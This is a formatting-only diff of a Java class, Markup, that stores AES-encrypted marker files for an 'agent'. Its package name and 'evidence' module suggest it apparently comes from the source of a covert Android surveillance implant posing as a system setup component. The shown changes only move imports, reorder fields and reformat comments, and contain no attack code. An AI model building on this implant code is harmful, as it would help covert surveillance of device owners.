@@ -9,15 +9,6 @@
 
 package com.android.syssetup.evidence;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.ObjectInput;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutput;
-import java.io.ObjectOutputStream;
-import java.io.Serializable;
-
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.crypto.CryptoException;
 import com.android.syssetup.crypto.Digest;
@@ -31,22 +22,30 @@ import com.android.syssetup.module.BaseModule;
 import com.android.syssetup.util.ByteArray;
 import com.android.syssetup.util.Check;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectInput;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutput;
+import java.io.ObjectOutputStream;
+import java.io.Serializable;
+
 /**
  * The Class Markup.
  */
 public class Markup {
 
-	private static final String TAG = "Markup"; //$NON-NLS-1$
 	//$NON-NLS-1$
 	public static final String MARKUP_EXTENSION = ".mm"; //$NON-NLS-1$
 	public static final int DEL_OLD_FILE_MARKUP = 1;
+	private static final String TAG = "Markup"; //$NON-NLS-1$
 	public static byte markupSeed;
 	public static boolean markupInit;
+	private final Encryption encryption;
 	private String markupId = "core"; //$NON-NLS-1$
-
 	private String lognName;
 	private AutoFile file;
-	private final Encryption encryption;
 
 	private Markup() {
 		encryption = new Encryption(Keys.self().getAesKey());
@@ -54,11 +53,9 @@ public class Markup {
 
 	/**
 	 * Instantiates a new markup.
-	 * 
-	 * @param agentId_
-	 *            the agent id_
-	 * @param aesKey
-	 *            the aes key
+	 *
+	 * @param agentId_ the agent id_
+	 * @param aesKey   the aes key
 	 */
 	protected Markup(final String agentId_) {
 		this();
@@ -98,21 +95,9 @@ public class Markup {
 	}
 
 	/**
-	 * Crea un markup vuoto.
-	 * 
-	 * @return true if successful
-	 */
-	public boolean createEmptyMarkup() {
-		return writeMarkup(null);
-	}
-
-	/**
-	 * 
-	 * @param agentId
-	 *            the agent id
+	 * @param agentId the agent id
 	 * @param num
-	 * @param addPath
-	 *            the add path
+	 * @param addPath the add path
 	 * @return the string
 	 */
 	static String makeMarkupName(String agentId, final boolean addPath) {
@@ -154,7 +139,7 @@ public class Markup {
 
 	/**
 	 * Rimuove tutti i file di markup presenti sul filesystem.
-	 * 
+	 *
 	 * @return
 	 */
 
@@ -175,8 +160,17 @@ public class Markup {
 	}
 
 	/**
+	 * Crea un markup vuoto.
+	 *
+	 * @return true if successful
+	 */
+	public boolean createEmptyMarkup() {
+		return writeMarkup(null);
+	}
+
+	/**
 	 * Check. if is markup. //$NON-NLS-1$
-	 * 
+	 *
 	 * @return true, if is markup
 	 */
 	public synchronized boolean isMarkup() {
@@ -199,10 +193,9 @@ public class Markup {
 	 * Markup e' vuoto restituisce un byte[0]. E' possibile creare dei markup
 	 * vuoti, in questo caso non va usata la ReadMarkup() ma semplicemente la
 	 * IsMarkup() per vedere se e' presente o meno.
-	 * 
+	 *
 	 * @return the byte[]
-	 * @throws IOException
-	 *             Signals that an I/O exception has occurred.
+	 * @throws IOException Signals that an I/O exception has occurred.
 	 */
 	public synchronized byte[] readMarkup() throws IOException {
 		if (Cfg.DEBUG) {
@@ -283,9 +276,8 @@ public class Markup {
 	 * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
 	 * funzione torna TRUE se e' andata a buon fine, FALSE altrimenti. Il
 	 * contenuto scritto e' cifrato.
-	 * 
-	 * @param data
-	 *            the data
+	 *
+	 * @param data the data
 	 * @param num
 	 * @return true, if successful
 	 */
@@ -353,7 +345,7 @@ public class Markup {
 						Check.log(TAG + " (unserialize): " + ret);//$NON-NLS-1$
 					}
 					return ret;
-				}else{
+				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (unserialize) Error, unserializable object.");
 					}
